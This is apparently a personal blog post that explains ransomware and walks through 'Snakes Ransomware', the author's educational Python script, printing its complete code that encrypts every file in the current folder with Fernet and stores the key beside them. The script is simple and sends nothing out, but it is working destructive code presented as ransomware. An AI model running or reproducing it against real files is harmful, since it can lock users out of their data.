---
title: "Understanding Ransomware and a Dive into Snakes Ransomware"
meta_title: ""
description: "Ransomware"
date: 2022-05-16T05:00:00Z
image: "/images/snakes-ransomware.png"
categories: ["Project","Ransomware", "Python"]
author: "Krishna Chaitanya Ethamukkala"
tags: ["snakes ransomware", "ransomware"]
draft: false
---
## What is Ransomware?

Ransomware is a type of malicious software designed to block access to a computer system or encrypt its data until a sum of money, or ransom, is paid. It’s a form of cyber extortion that has become increasingly prevalent, targeting individuals, businesses, and even government organizations. Once infected, victims are often left with a grim choice: pay the ransom to regain access to their files or risk losing them forever.

### How Ransomware Works

Ransomware typically spreads through phishing emails, malicious websites, or software vulnerabilities. When the malware is executed, it begins encrypting files on the victim's system, rendering them inaccessible. A ransom note is then displayed, demanding payment in exchange for the decryption key.

The use of ransomware has evolved over the years, with cybercriminals employing more sophisticated techniques to avoid detection and increase their chances of receiving payment. Unfortunately, even after paying the ransom, there’s no guarantee that the files will be restored.

## Introduction to Snakes Ransomware

Snakes Ransomware is a Python-based tool I’ve developed to demonstrate the encryption and decryption processes involved in ransomware. While this project is intended purely for educational purposes, it highlights the mechanics of ransomware in a controlled environment.

### Features of Snakes Ransomware

- **File Encryption:** Encrypts all files in a specified folder.
- **Key Generation:** Creates a unique key for each encryption process, which is crucial for decryption.
- **File Decryption:** Provides a way to decrypt the previously encrypted files using the generated key.

## How to Use Snakes Ransomware

### Step 1: Installation

First, ensure you have all the required dependencies installed. You can do this by running the following command in your terminal:

```bash
pip install -r requirements.txt
```

### Step 2: Encryption Process

To encrypt files within a target folder:

1. **Copy the Encryption Script:**
   - Place the `snakes-encrypt.py` file into the folder you want to encrypt.

2. **Execute the Script:**
   - Open a terminal and navigate to the folder containing the script.
   - Run the following command:
   
     ```bash
     python snakes-encrypt.py
     ```

3. **Encryption Completion:**
   - After execution, all files in the folder will be encrypted, and a key file named `snakes-key.key` will be generated. This key is essential for decrypting the files.

### Step 3: Decryption Process

To decrypt the files:

1. **Copy the Decryption Script:**
   - Place the `snakes-decrypt.py` file in the folder containing the encrypted files.

2. **Add the Encryption Key:**
   - Ensure the `snakes-key.key` file is in the same directory as the decryption script.

3. **Execute the Decryption Script:**
   - Run the following command in your terminal:
   
     ```bash
     python snakes-decrypt.py
     ```

4. **Decryption Completion:**
   - The encrypted files will be restored to their original state.

## How Snakes Ransomware Was Created

Creating Snakes Ransomware involved a deep dive into cryptography and file handling in Python. The key aspects of the program include:


### **Encryption Script Explanation**

This script is designed to encrypt all files in the current directory, except for the encryption script itself and the key file.

#### **1. Importing Necessary Libraries:**
```python
import os
from cryptography.fernet import Fernet
```
- `os`: Used to interact with the operating system for file operations.
- `cryptography.fernet`: A symmetric encryption method from the `cryptography` library, which is used to encrypt and decrypt files.

#### **2. Listing Files to Encrypt:**
```python
files = []

for file in os.listdir():
    if file == "snakes-encrypt.py" or file == "snakes-key.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
```
- The script lists all files in the current directory.
- It excludes the encryption script (`snakes-encrypt.py`) and the key file (`snakes-key.key`) to prevent them from being encrypted.

#### **3. Generating the Encryption Key:**
```python
key = Fernet.generate_key()

with open("snakes-key.key", "wb") as thekey:
    thekey.write(key)
```
- A new encryption key is generated using `Fernet.generate_key()`.
- This key is saved in a file called `snakes-key.key`. This key is essential for decrypting the files later.

#### **4. Encrypting the Files:**
```python
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
```
- The script loops through each file in the `files` list.
- It reads the contents of each file in binary mode (`"rb"`).
- The contents are encrypted using the generated key.
- The encrypted contents are then written back to the original file in binary mode (`"wb"`), replacing the original contents with the encrypted data.

### **Complete Encryption Script**

Here's the complete encryption script with comments for clarity:

```python
#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# List of files to be encrypted
files = []

# Identify files to encrypt, excluding the script and key files
for file in os.listdir():
    if file == "snakes-encrypt.py" or file == "snakes-key.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print("Files to be encrypted:", files)

# Generate encryption key and save it to a file
key = Fernet.generate_key()

with open("snakes-key.key", "wb") as thekey:
    thekey.write(key)

# Encrypt each file
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)

    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Encryption completed.")
```


## Conclusion

Ransomware remains one of the most significant threats in cybersecurity today. By understanding how it works through projects like Snakes Ransomware, we can better prepare ourselves to defend against such attacks. Remember, the Snakes Ransomware project is strictly for educational purposes, and I strongly discourage any malicious use of this knowledge.

For more insights into cybersecurity and programming, stay tuned to Krishna-Blogs!

---
[Github Repo](https://cs50.harvard.edu/python/2024/) -- For referance

Contact: ekrishnachaitanya2004@gmail.com 'or'
        snakesnnetworks@gmail.com
